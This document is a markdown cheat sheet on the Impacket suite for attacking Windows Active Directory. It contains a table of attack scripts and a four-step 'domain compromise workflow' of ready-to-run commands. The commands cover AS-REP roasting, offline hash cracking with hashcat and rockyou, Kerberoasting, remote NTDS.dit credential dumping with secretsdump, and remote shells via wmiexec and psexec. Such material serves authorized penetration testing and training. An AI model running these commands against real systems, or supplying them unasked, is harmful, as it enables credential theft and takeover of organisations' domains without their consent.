# 🛠️ Impacket Suite Master Guide — Windows Domain Exploitation

> [!INFO] 📌 **Tool Metadata**
> - **Category**: Active Directory & Windows Protocol Exploitation (#1 Choice)
> - **Installation**: `sudo apt install python3-impacket`
> - **Primary Objective**: Python classes for working with network protocols (SMB, MSRPC, NTLM, Kerberos), performing Kerberoasting, AS-REP Roasting, Pass-the-Hash, and remote shell execution.

---

## 📋 Primary Impacket Scripts Reference Matrix

| Script Name | Purpose & Operational Function | Key Example Command Syntax |
| :--- | :--- | :--- |
| `GetNPUsers.py` | AS-REP Roasting (Extracts Kerberos TGT hashes for accounts with `DONT_REQ_PREAUTH` enabled) | `python3 GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip <dc_ip>` |
| `GetUserSPNs.py` | Kerberoasting (Requests TGS tickets for Service Principal Names to crack offline) | `python3 GetUserSPNs.py domain.local/user:pass -dc-ip <dc_ip> -request` |
| `secretsdump.py` | Remote SAM & NTDS.dit password hash extraction | `python3 secretsdump.py domain.local/admin:pass@<dc_ip>` |
| `wmiexec.py` | Stealthy remote command execution via WMI | `python3 wmiexec.py domain.local/admin:pass@<target_ip>` |
| `psexec.py` | Remote service installation shell (SYSTEM privilege) | `python3 psexec.py domain.local/admin:pass@<target_ip>` |
| `smbserver.py` | Spawns local SMB share server to host tools/payloads | `sudo python3 smbserver.py share ./ -smb2support` |

---

## 💻 Step-by-Step Active Directory Domain Compromise Workflow

```bash
# 1. Perform AS-REP Roasting to find pre-authentication disabled accounts
python3 GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep_hashes.txt

# 2. Crack captured AS-REP hash with Hashcat (Mode 18200)
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# 3. Perform Kerberoasting with authenticated domain credentials
python3 GetUserSPNs.py corp.local/jdoe:Password123 -dc-ip 10.10.10.10 -request -outputfile kerberoast_tgs.txt

# 4. Dump NTDS.dit Domain Hashes remotely with Administrator credentials
python3 secretsdump.py corp.local/administrator:P@ssw0rd2026@10.10.10.10 -just-dc
```
